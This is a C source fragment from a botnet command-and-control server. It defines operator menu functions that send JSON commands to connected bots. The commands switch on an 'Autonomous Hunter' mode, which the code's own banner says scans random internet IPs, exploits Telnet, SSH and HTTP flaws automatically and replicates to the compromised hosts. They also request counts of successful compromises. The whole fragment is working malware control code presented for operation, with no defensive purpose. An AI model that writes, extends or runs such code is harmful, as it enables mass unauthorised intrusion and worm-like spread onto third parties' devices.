// Hunter Mode Commands for C2
// Functions to control and monitor the Autonomous Hunter

void cmd_hunter_toggle() {
    clear_screen();
    
    printf(BRIGHT_YELLOW);
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║          🎯 AUTONOMOUS HUNTER MODE CONTROL                      ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║                                                                ║\n");
    printf("║  The Hunter scans random IP ranges on the internet looking    ║\n");
    printf("║  for vulnerable devices and exploits them automatically.      ║\n");
    printf("║                                                                ║\n");
    printf("║  • Scans 50 IPs simultaneously                                ║\n");
    printf("║  • Targets: Telnet, SSH, HTTP (CVE exploits)                  ║\n");
    printf("║  • Auto-replicates to compromised hosts                       ║\n");
    printf("║  • Reports stats every 5 minutes                              ║\n");
    printf("║                                                                ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    printf(RESET);
    
    printf("\n" BRIGHT_CYAN "Select action:\n" RESET);
    printf("  " BRIGHT_GREEN "[1]" RESET " Enable Hunter on ALL bots\n");
    printf("  " BRIGHT_YELLOW "[2]" RESET " Enable Hunter on SPECIFIC bot\n");
    printf("  " BRIGHT_RED "[3]" RESET " Disable Hunter on ALL bots\n");
    printf("  " BRIGHT_WHITE "[0]" RESET " Cancel\n");
    printf("\n" BRIGHT_WHITE "Choice" BRIGHT_CYAN " ►" RESET " ");
    
    char choice[10];
    if (fgets(choice, sizeof(choice), stdin) == NULL) return;
    choice[strcspn(choice, "\n")] = '\0';
    
    if (strcmp(choice, "1") == 0) {
        // Enable hunter on all bots
        printf(BRIGHT_YELLOW "\n🚀 Enabling Hunter Mode on ALL bots...\n" RESET);
        
        pthread_mutex_lock(&bots_mutex);
        int sent = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_active) continue;
            
            // Send hunter command via JSON
            char cmd[256];
            snprintf(cmd, sizeof(cmd), 
                "{\"action\":\"hunter\",\"state\":\"on\"}\n");
            
            if (bots[i].ssl) {
                SSL_write(bots[i].ssl, cmd, strlen(cmd));
            } else {
                send(bots[i].socket, cmd, strlen(cmd), 0);
            }
            sent++;
        }
        pthread_mutex_unlock(&bots_mutex);
        
        printf(BRIGHT_GREEN "✓ Hunter command sent to %d bots!\n" RESET, sent);
        printf(BRIGHT_CYAN "  They will start scanning the internet in ~10 seconds.\n" RESET);
        
    } else if (strcmp(choice, "2") == 0) {
        // Enable hunter on specific bot
        printf(BRIGHT_CYAN "\nEnter bot ID: " RESET);
        char bot_id[64];
        if (fgets(bot_id, sizeof(bot_id), stdin) == NULL) return;
        bot_id[strcspn(bot_id, "\n")] = '\0';
        
        pthread_mutex_lock(&bots_mutex);
        int found = -1;
        for (int i = 0; i < bot_count; i++) {
            if (strcmp(bots[i].id, bot_id) == 0 && bots[i].is_active) {
                found = i;
                break;
            }
        }
        
        if (found == -1) {
            printf(BRIGHT_RED "❌ Bot not found!\n" RESET);
            pthread_mutex_unlock(&bots_mutex);
        } else {
            char cmd[256];
            snprintf(cmd, sizeof(cmd), 
                "{\"action\":\"hunter\",\"state\":\"on\"}\n");
            
            if (bots[found].ssl) {
                SSL_write(bots[found].ssl, cmd, strlen(cmd));
            } else {
                send(bots[found].socket, cmd, strlen(cmd), 0);
            }
            pthread_mutex_unlock(&bots_mutex);
            
            printf(BRIGHT_GREEN "✓ Hunter enabled on bot %s\n" RESET, bot_id);
        }
        
    } else if (strcmp(choice, "3") == 0) {
        // Disable hunter on all bots
        printf(BRIGHT_RED "\n🛑 Disabling Hunter Mode on ALL bots...\n" RESET);
        
        pthread_mutex_lock(&bots_mutex);
        int sent = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_active) continue;
            
            char cmd[256];
            snprintf(cmd, sizeof(cmd), 
                "{\"action\":\"hunter\",\"state\":\"off\"}\n");
            
            if (bots[i].ssl) {
                SSL_write(bots[i].ssl, cmd, strlen(cmd));
            } else {
                send(bots[i].socket, cmd, strlen(cmd), 0);
            }
            sent++;
        }
        pthread_mutex_unlock(&bots_mutex);
        
        printf(BRIGHT_GREEN "✓ Stop command sent to %d bots\n" RESET, sent);
        printf(BRIGHT_CYAN "  (Active scan threads will finish current tasks)\n" RESET);
    }
    
    sleep(3);
}

void cmd_hunter_stats() {
    clear_screen();
    
    printf(BRIGHT_MAGENTA);
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║              📊 HUNTER MODE STATISTICS                          ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf(RESET);
    
    printf("\n" BRIGHT_CYAN "Requesting stats from all bots with Hunter enabled...\n" RESET);
    
    pthread_mutex_lock(&bots_mutex);
    int requests_sent = 0;
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_active) continue;
        
        // Request hunter stats
        char cmd[256];
        snprintf(cmd, sizeof(cmd), 
            "{\"action\":\"get_hunter_stats\"}\n");
        
        if (bots[i].ssl) {
            SSL_write(bots[i].ssl, cmd, strlen(cmd));
        } else {
            send(bots[i].socket, cmd, strlen(cmd), 0);
        }
        requests_sent++;
    }
    pthread_mutex_unlock(&bots_mutex);
    
    if (requests_sent == 0) {
        printf(BRIGHT_RED "\n❌ No active bots to query\n" RESET);
    } else {
        printf(BRIGHT_GREEN "\n✓ Stats request sent to %d bots\n" RESET, requests_sent);
        printf(BRIGHT_CYAN "  Check C2 logs or reports for detailed statistics.\n" RESET);
        printf(BRIGHT_YELLOW "\n  Expected metrics:\n" RESET);
        printf("    • IPs scanned per second\n");
        printf("    • Total hosts found\n");
        printf("    • Exploits attempted\n");
        printf("    • Successful compromises\n");
        printf("    • Success rate %%\n");
    }
    
    printf("\n" BRIGHT_MAGENTA "Press Enter to continue..." RESET);
    getchar();
}
